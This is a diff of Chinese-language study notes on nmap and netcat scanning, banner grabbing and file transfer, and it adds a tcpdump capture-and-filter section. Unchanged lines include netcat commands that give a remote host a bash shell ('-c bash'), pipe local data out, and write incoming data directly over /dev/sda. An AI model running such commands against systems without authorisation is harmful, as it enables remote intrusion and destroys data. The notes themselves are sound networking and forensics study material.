@@ -30,10 +30,6 @@ Nmap扫描排除扫描目标
 # nmap -A 192.168.1.105
 可以看到目标主机上开启的端口、服务器、版本、操作系统版本、内核、系统类型等。根据分析输出的信息，可知目标主机上运行了FTP、SSH、Telnet等服务，并且可以看到各服务的版本及权限信息。
 
-
-
-
-
 nmap localhost                    #查看主机当前开放的端口
 nmap -p 1024-65535 localhost      #查看主机端口（1024-65535）中开放的端口
 nmap -PS 目标主机IP                #探测目标主机开放的端口
@@ -48,6 +44,11 @@ nmap -su       #UDP扫描
 nmap -sP       #ICMP扫描
 nmap -P0       #跳过ping检测
 
+
+
+
+
+
 常用参数组合：nc -z -v -n 目标主机IP 21-25         
 解析：打印21到25 所有开放的端口
      z参数告诉netcat使用0 IO,连接成功后立即关闭连接,不进行数据交换 ，v参数指使用冗余选项，n 参数告诉netcat 不要使用DNS反向查询IP地址的域名
@@ -55,9 +56,6 @@ nmap -P0       #跳过ping检测
 #会连接开放端口21并且打印运行在这个端口上服务的banner信息，Banner是一个文本，Banner是一个你连接的服务发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。但是，并不是所有的服务都会发送banner
 # nc -zv -u  目标主机IP  500
 解析：UDP 500端口又叫isakmp,用来建立VPN用的端口。现在VPN断了，所以测试下500端口通不通。一般UDP端口很难测试，只能用netcat来测
-
-
-
 
 ping smtp.163.com        -->得到公网ip
 nc -nv 123.125.50.138 25
@@ -82,8 +80,7 @@ B: lsof | nc -nv 192.168.66.203 222 -q 1
 A: cat lsof.txt
  
  
-
-
+ 
 
 #传输文件：
 A：nc -lk 333 < 2.3.mp4 -q 1
@@ -105,12 +102,6 @@ NC 端口扫描：
 nc -nvz  192.168.66.204 1-65535
 nc -vnzu 192.168.66.204 1-1024
 
-
-
-
-
-
-
 NC远程克隆硬盘：
 使用场景，远程电子取证，可以将目标服务器硬盘远程复制或者内存
 A： nc lk 333 | dd of=/dev/sda
@@ -129,7 +120,28 @@ B : nc -nv 192.168.66.203 333 -c bash
 
 
 
+TCPDUMP
+NO-GUI 的抓包分析工具
+Linux/Unix系统默认安装
 
+默认只抓68个字节
+tcpdump -i eth0 -s 0 -w file.pacap     //-s 大小 0表示多大都抓取。-w写入指定文件
+tcpdump -i eth0 port 22                //实时显示
+
+读取抓包文件
+tcpdump -r file.pcap
+tcpdump -A -r file.pcap                //以阿克斯码形式显示
+tcpdump -X -r file.pcap                //十六进制显示
+
+常用显示筛选：
+tcpdump -n -r http.cap | akw '{print $3}' | sort -u   //n不对ip地址进行解析域名
+tcpdump -n src host 192.168.0.1 -r http.cap           //筛选来源ip为192.168.0.1
+tcpdump -n dst host 192.168.0.2 -r http.cap
+tcpdump -n port 53 -r http.cap
+tcpdump -nX port 80 -r http.cap
+
+高级显示筛选：
+tcpdump -A -n 'tcp[13]=24' -r http.cap         //tcp第13个字节
 
 
 
